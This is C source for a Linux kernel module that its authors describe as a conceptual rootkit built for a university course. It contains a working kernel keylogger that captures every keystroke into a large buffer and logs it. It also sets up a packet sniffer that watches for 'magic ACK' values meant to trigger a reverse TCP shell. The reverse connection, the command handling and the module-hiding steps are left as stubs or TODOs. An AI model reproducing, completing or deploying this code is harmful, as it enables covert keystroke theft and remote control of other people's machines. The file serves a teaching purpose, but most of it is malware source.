/**
 * Project:
 *   + A conceptual rootkit developed as a term project.
 *   + COSC 439, Towson University
 *   + Taught by Shiva Azadegan
 *
 * Usage:
 *   START: $> insmod rootkit.ko
 *   STOP : $> rmmod rootkit
 * 
 * Authors:
 *   + Zachary Brown
 *   + Kevin Hoganson
 *   + Alexander Slonim
**/
#include <linux/module.h>
#include <linux/kernel.h>

#include <asm/uaccess.h>
#include <asm/segment.h>

#include <linux/netdevice.h>
#include <linux/socket.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/in.h>

#include <linux/keyboard.h>				/* Used for keyboard_notifier.		*/
#include <linux/syscalls.h>				/* Used for syst calls (kern/usr).  */
#include <linux/kthread.h>				/* Used to create network thread.   */

#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */

#define SHIFT_ENABLED  1				/* Shift key is enabled.  */
#define SHIFT_DISABLED 0				/* Shift key is disabled. */

#define CONNECTED      1				/* r-TCP connection established.     */
#define DISCONNECTED   0				/* r-TCP connection not established. */

mm_segment_t oldfs;


/**
 * KEYLOGGER FUNCTIONALITY
**/
char keyboard_buffer[KEYBOARD_BUFFER_SIZE];
int  keyboard_index;
int  shift_state;


/**
 * NETWORK LISTENING FUNCTIONALITY
**/
struct packet_type  net_proto;
struct task_struct *net_thread;
struct sockaddr_in  sock_in;
struct socket      *sock;


/**
 * REVERSE TCP SHELL FUNCTIONALITY
**/
int connection_state;
unsigned long int acks[] =
{
	2035414082,
	1923488235,
	1039496434,
	455162575,
	1256802356,
	121160666,
	775584247,
	400038231,
	966583691,
	1678453465,
	653897989,
	1891123724,
	584692231,
	1540142942,
	1462005693,
	1331651723,
	1698886690,
	763403905,
	1671908051,
	922525094
};

/**
 * Correlates with the key definitions found in:
 * /usr/include/linux/input.h
**/
char *letters[] = 
{
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
	"o", "p", "[", "]", "ENTER", "LCTRL", "a", "s", "d", "f", "g", "h",
	"j", "k", "l", ";", "'", "`", "LSHIFT", "\\", "z", "x", "c", "v", "b",
	"n", "m", ",", ".", "/", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};


/**
 * Can be used for uppercase lettering. In other words:
 * Use this whenever SHIFT is enabled.
**/
char *shift_letters[] = 
{
	"RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
	"_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
	"O", "P", "{", "}", "ENTER", "LCTRL", "A", "S", "D", "F", "G", "H",
	"J", "K", "L", ":", "\"", "~", "LSHIFT", "|", "Z", "X", "C", "V", "B",
	"N", "M", "<", ">", "?", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};


/**
 * TODO: 
 *   - Send keyboard buffer to control server. 
**/
int notification(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	char   *buffer;
	char   *key;
	char   c;
	int    i;

	// 83 character values are registered above (letters). 
	if (code == KBD_KEYCODE && param->value <= 83)
	{
		// If the key is Left or Right Shift.
		if (param->value == 42 || param->value == 54)
		{
			if (param->down > 0) shift_state = SHIFT_ENABLED;
			else 				 shift_state = SHIFT_DISABLED;

			return NOTIFY_OK;
		}

		if (param->down)
		{
			// If the shift key is being held down.
			if (shift_state) 
			{
				printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", shift_letters[param->value]);
				key = shift_letters[param->value];
			}

			else
			{
				printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", letters[param->value]);
				key = letters[param->value];
			}

			// Add each letter in the string returned by key_notifier to the buffer. 
			buffer = keyboard_buffer;
			for (i = 0; i < strlen(shift_letters[param->value]); i++)
			{
				c = key[i];
				// Test if keyboard_buffer is full.
				if (keyboard_index < KEYBOARD_BUFFER_SIZE)
					buffer[keyboard_index++] = c;

				/**
				 * TODO:
				 *   + Send keyboard buffer to control server. 
				**/
				// Currently flushes the keyboard buffer.
				else
				{
					memset(&keyboard_buffer, '0', KEYBOARD_BUFFER_SIZE);
					keyboard_index = 0;
					buffer[keyboard_index++] = c;

					/**
					if (connection_state)
						// send buffer to control server
					else
						// switch to userspace
						// write butter to file
						// exit userspace to kernelspace
					**/
				}
			}
		}
	}

	return NOTIFY_OK;
}


static struct notifier_block nb =
{
	.notifier_call = notification
};


void reverse_connect(void)
{
	// unsigned long  int server_ip;
	// unsigned short int server_port;

	printk("Initializing network socket.\n");
	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
	{
		printk("Error in creating socket.\n");
	}

	/**
	 * server_ip and server_port are still undefined.
	**/
	memset(&sock_in, 0, sizeof(sock_in));
	//sock_in.sin_addr.s_addr = htonl(server_ip);
	sock_in.sin_family = AF_INET;
	//sock_in.sin_port = htons(server_port);

	/**
	printk("Attempting to connect to server [expected not to].\n");
	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
		printk("Could not connect [expected].\n");
	else
	{
		connection_state = CONNECTED;
		printk("Connected to server.\n");
	}
	**/
}


/* Up to 20 different commands. */
void handle_command(unsigned long int ack_seq)
{
	printk("Handling: %lu\n", ack_seq);
	switch (ack_seq)
	{
		case 2035414082:
			break;
		case 1923488235:
			break;
		case 1039496434:
			break;
		case 455162575:
			break;
		case 1256802356:
			break;
		case 121160666:
			break;
		case 775584247:
			break;
		case 400038231:
			break;
		case 966583691:
			break;
		case 1678453465:
			break;
		case 653897989:
			break;
		case 1891123724:
			break;
		case 584692231:
			break;
		case 1540142942:
			break;
		case 1462005693:
			break;
		case 1331651723: 
			break;
		case 1698886690:
			break;
		case 763403905:
			break;
		case 1671908051:
			break;
		case 922525094:
			break;
		default:
			break;
	}
}


int packet_rcv(struct sk_buff *skb, struct net_device *dev,
	struct packet_type *ptype, struct net_device *orig_dev)
{
	struct tcphdr *tcp_header;
	struct iphdr  *ip_header;

	unsigned long int ack_seq;
	unsigned long int seq;

	int i;
	
	printk("One packet received.\n");
	ip_header = (struct iphdr *)skb_network_header(skb);

	if (ip_header->protocol == IPPROTO_TCP)
	{
		printk("Was a TCP packet.\n");
		tcp_header = (struct tcphdr *) ((unsigned int *) ip_header + ip_header->ihl);

		ack_seq = ntohl(tcp_header->ack_seq);
		seq     = ntohl(tcp_header->seq);
		printk("ack_seq: %lu\n", ack_seq);
		printk("seq:     %lu\n", seq);

		/* Use after magic 'ACK' was received. Refer to 'acks'.       */
		/* Server IP and Port could be enumerated from"magic ACK".    */
		/* Could have numerous magic ACK's in a magic list!			  */
		
		for (i = 0; i < 20; i++)
		{
			if (ack_seq == acks[i])
			{
				if (!connection_state)
				{
					printk("Would attempt to connect.\n");
					connection_state = CONNECTED;
					//reverse_connect();
					// or, if ack_seq enumerates server ip / port..
					// reverse_connect(ack_seq);
				}
				else
					handle_command(ack_seq);
			}
		}
	}

	kfree_skb(skb);
	return 0;
}


int start_listen(void *args)
{
	printk("Starting network sniffing.\n");
	net_proto.type = htons(ETH_P_ALL);
	net_proto.dev  = NULL;
	net_proto.func = packet_rcv;
	dev_add_pack(&net_proto);

	printk("Stopping network-listening thread.\n");
	kthread_stop(net_thread);

	return 0;
}


/**
 * TODO:
 *   - Hide the module:
 *     + Option1:  Overwrite "lsmod"
 *     + Option2:  Delete module listing "rootkit" from modules.
 *     + Do this last (for the sake of debugging).
 *   - Configure rootkit to be a client.
 *     + Will connect to the control-server on the 192.168.1.0/24 subnet.
 *     + This connection is, thus, a reverse-TCP connection.
**/
int start(void)
{
	printk("Rootkit started.\n");
	
	printk("Registering keyboard notifier.\n");
	register_keyboard_notifier(&nb);
	keyboard_index = 0;

	printk("Starting network-listening thread.\n");
	net_thread = kthread_create(start_listen, NULL, "network_listener");
	wake_up_process(net_thread);
	connection_state = DISCONNECTED;

	return 0;
}


void stop(void)
{
	printk("Unregistering keyboard notifier.\n");
	unregister_keyboard_notifier(&nb);
	printk("Keyboard notifier unregistered.\n"); 

	printk("Removing netdevice pack.\n");
	dev_remove_pack(&net_proto);

	printk("Rootkit stopped.\n");
}

module_init(start);
module_exit(stop);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kevin Hoganson - khogan8@students.towson.edu");
MODULE_AUTHOR("Zachary Brown  - zbrown4@students.towson.edu");
MODULE_AUTHOR("Alex Slonim    - a.slonim412@gmail.com");
MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC 439.");